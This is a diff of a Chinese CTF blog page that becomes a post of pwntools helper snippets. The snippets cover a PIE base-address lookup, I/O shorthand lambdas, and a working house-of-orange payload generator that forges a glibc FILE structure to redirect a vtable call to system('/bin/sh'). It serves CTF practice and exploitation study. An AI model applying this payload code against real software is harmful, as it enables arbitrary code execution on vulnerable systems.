@@ -8,19 +8,21 @@
 
   
 
-  <title>Tag: pwnable.tw | t1an5t&#39;s Treasure</title>
+  <title>造轮子 | t1an5t&#39;s Treasure</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Pwner and NEUer.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="t1an5t&#39;s Treasure">
-<meta property="og:url" content="http://tianstcht.github.io/tags/pwnable-tw/index.html">
+  <meta name="description" content="前言造一些轮子来简化一些pwn相关的操作，其实并不复杂，连偷带编造出了一些，慢慢会往里添加更多。">
+<meta name="keywords" content="pwnable">
+<meta property="og:type" content="article">
+<meta property="og:title" content="造轮子">
+<meta property="og:url" content="http://tianstcht.github.io/造轮子/index.html">
 <meta property="og:site_name" content="t1an5t&#39;s Treasure">
-<meta property="og:description" content="Pwner and NEUer.">
+<meta property="og:description" content="前言造一些轮子来简化一些pwn相关的操作，其实并不复杂，连偷带编造出了一些，慢慢会往里添加更多。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-06-19T07:50:53.654Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="t1an5t&#39;s Treasure">
-<meta name="twitter:description" content="Pwner and NEUer.">
+<meta name="twitter:title" content="造轮子">
+<meta name="twitter:description" content="前言造一些轮子来简化一些pwn相关的操作，其实并不复杂，连偷带编造出了一些，慢慢会往里添加更多。">
 
   
 
@@ -150,44 +152,117 @@
 </header>
 
     <div class="outer">
-      <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap"  data-scroll-reveal="enter left and over 0.7s">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div  class="archive-article-inner">
-    <header class="archive-article-header">
-      <a  href="/pwnab13-7w/" class="archive-article-date">
+      <section id="main"><article   id="post-造轮子" class="article article-type-post" itemscope itemprop="blogPost">
+  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
+    <a  href="/造轮子/" class="article-date">
   <i class="fa fa-calendar"></i>
-  <time  datetime="2019-06-19T07:14:30.000Z" itemprop="datePublished">6月 19</time>
+  <time  datetime="2019-06-19T07:40:33.000Z" itemprop="datePublished">2019-06-19</time>
 </a>
 
-      
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwnable/">pwnable</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner"  >
+    
+    
+
+      <header class="article-header">
+
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/pwnab13-7w/">
-        <i class="fa fa-pencil-square-o  article-title-icon"></i>pwnab13.7w</a>
+    <h1 class="article-title" itemprop="name">
+      <i class="fa fa-pencil-square-o  article-title-icon"></i>造轮子
     </h1>
   
 
 
-    </header>
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+        </br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>造一些轮子来简化一些<code>pwn</code>相关的操作，其实并不复杂，连偷带编造出了一些，慢慢会往里添加更多。</p>
+<a id="more"></a>
+
+
+
+<h2 id="获取开pie程序的基地址："><a href="#获取开pie程序的基地址：" class="headerlink" title="获取开pie程序的基地址："></a>获取开<code>pie</code>程序的基地址：</h2><p>传入<code>process</code>的那个类，就能得到基地址，方便调试。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proc_base</span><span class="params">(p)</span>:</span></span><br><span class="line">    proc_base = p.libs()[p._cwd+p.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">return</span> proc_base</span><br></pre></td></tr></table></figure>
+
+<h2 id="house-of-orange-快速生成payload"><a href="#house-of-orange-快速生成payload" class="headerlink" title="house of orange 快速生成payload"></a>house of orange 快速生成payload</h2><p>主要参考了：<a href="https://xz.aliyun.com/t/2411#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411#toc-3</a></p>
+<p>只需要<code>libc</code>和<code>libc</code>基地址，然后从<code>unsortedbin</code>的<code>pre_size</code>开始写的<code>payload</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr<span class="number">-0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                       )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr<span class="number">-8</span>)  <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io_str_jumps_offset</span><span class="params">(libc)</span>:</span></span><br><span class="line">    IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">    <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">        possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">            <span class="comment"># print possible_IO_str_jumps_offset</span></span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange_payload</span><span class="params">(libc, libc_base)</span>:</span></span><br><span class="line">	io_str_jump = libc_base + get_io_str_jumps_offset(libc)</span><br><span class="line">	io_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">	payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="简化IO交互"><a href="#简化IO交互" class="headerlink" title="简化IO交互"></a>简化IO交互</h2><p>这个其实好多人都在用，直接给封装了，用的时候代码量就更少了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru,sn,rl,sl,rv,sa,sla,slog,flog = simple_io(p)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simple_io</span><span class="params">(p)</span>:</span></span><br><span class="line">    ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">    sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">    rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">    sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">    rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">    sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b) </span><br><span class="line">    sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line">    slog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">    flog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">    <span class="keyword">return</span> ru,sn,rl,sl,rv,sa,sla,slog,flog</span><br></pre></td></tr></table></figure>
+
+<p>虽然这样代码量少了不少，不过有时候会遇到一些莫名其妙的问题。</p>
+<p>。。。待续</p>
+
+      
+
+    </div>
+
+
+
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://tianstcht.github.io/造轮子/" data-id="cjx2xsp6v000fiwvgwrcbb43q" class="article-share-link" data-share="baidu" data-title="造轮子">分享到</a>
+      
+
+      
+        <a href="http://tianstcht.github.io/造轮子/#gitalk-container" class="article-comment-link">评论</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+
+
+    </footer>
   </div>
-</article>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/pwntools的使用技巧/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">← 上一篇</strong>
+      <div class="article-nav-title">pwntools的使用技巧</div>
+    </a>
+  
+  
+</nav>
+
 
   
-  
-    </div></section>
-  
+</article>
+
+
+
+
+  <section class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section> 
+
+
+
+
+  <div id="gitalk-container"></div>
+
 
 </section>
       
@@ -737,13 +812,13 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
   <script>
     var disqus_shortname = 'rapcoder';
     if (page.permalink){ 
-      var disqus_url = '';
+      var disqus_url = 'http://tianstcht.github.io/造轮子/';
      } 
     (function(){
       var dsq = document.createElement('script');
       dsq.type = 'text/javascript';
       dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
   </script>
